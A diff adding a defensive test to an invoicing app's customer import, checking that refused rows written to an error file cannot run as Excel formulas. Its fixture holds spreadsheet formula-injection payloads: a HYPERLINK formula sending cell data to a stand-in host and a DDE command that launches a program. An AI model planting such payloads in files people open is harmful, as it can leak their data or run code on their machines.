@@ -10,6 +10,7 @@ import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { DomainError, formatINR, isoDate, toDecimalString, toQuantityString } from '@invoice/kernel';
 import { trialBalance } from '@invoice/ledger';
+import { readDelimited } from '../src/csv.ts';
 import { buildHarness, bringIn, PERMISSIONS } from './harness.ts';
 import { BUSY_ITEMS, GSTIN_HOTEL, SALES_REGISTER, TALLY_STOCK, TRIAL_BALANCE, TRIAL_BALANCE_OUT_BY_1000, VYAPAR_CUSTOMERS } from './fixtures.ts';
 
@@ -56,6 +57,34 @@ describe('bringing in customers', () => {
     assert.match(preview.errorFile, /no name/);
     // The refused row comes back with its own cells intact, so it can be corrected in place.
     assert.match(preview.errorFile, /9000000000/);
+  });
+
+  it('never hands back a refused row whose cells would run as formulas in Excel (#394)', async () => {
+    const harness = await buildHarness();
+    const content = [
+      VYAPAR_CUSTOMERS.split('\r\n')[0],
+      `,9000000000,,"=HYPERLINK(""http://example.invalid/?""&A1,""fix"")",=cmd|' /C calc'!A0,@SUM(A1),+1+2,-500,Dr`,
+    ].join('\r\n');
+    const analysis = await harness.service.analyse(harness.actor, { ...customersCommand, content });
+    await harness.service.approveMapping(harness.actor, analysis.batch.id, {
+      columns: analysis.batch.proposal.columns,
+      fingerprint: analysis.batch.proposal.fingerprint,
+    });
+    const preview = await harness.service.preview(harness.actor, analysis.batch.id);
+
+    assert.equal(preview.rejected, 1);
+    const errorFile = preview.errorFile ?? '';
+    const raw = errorFile.split('\r\n')[1] ?? '';
+    assert.ok(raw.includes(`"'=HYPERLINK(""http://example.invalid/?""&A1,""fix"")"`), raw);
+    assert.ok(raw.includes(`'=cmd|' /C calc'!A0`), raw);
+    assert.ok(raw.includes(`'@SUM(A1)`), raw);
+    assert.ok(raw.includes(`'+1+2`), raw);
+    assert.ok(raw.includes(',-500,'), 'a plain negative number is left as a number');
+    assert.ok(!/(^|,)"?[=+@]/.test(raw), 'no cell starts with a formula');
+    // Brought back in, the corrected file reads as the person's own cells, without our mark.
+    const cells = readDelimited(errorFile).rows[0] ?? [];
+    assert.equal(cells[3], '=HYPERLINK("http://example.invalid/?"&A1,"fix")');
+    assert.equal(cells[4], "=cmd|' /C calc'!A0");
   });
 
   it('skips a customer the business already has instead of overwriting them', async () => {
